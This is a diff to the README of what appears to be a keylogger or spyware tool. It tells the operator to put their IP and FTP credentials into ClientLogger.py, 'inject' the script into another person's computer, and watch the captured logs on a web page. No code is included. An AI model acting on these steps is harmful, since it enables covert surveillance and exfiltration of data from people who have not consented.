@@ -21,7 +21,7 @@ When The Web Server and FTP has been execute correctly,
 <br>
 edit Clientlogger.py and enter Your IP,Username And Password to connect the script to FTP Server.
 <br>
-Inject ClientLogger.py in another Computer. And Go to "Spy active".
+Inject ClientLogger.py in another Computer. And Go to the web-site and select "Spy active".
 <br>
 All the log will be printend in the Box you Seeing.
 <br>
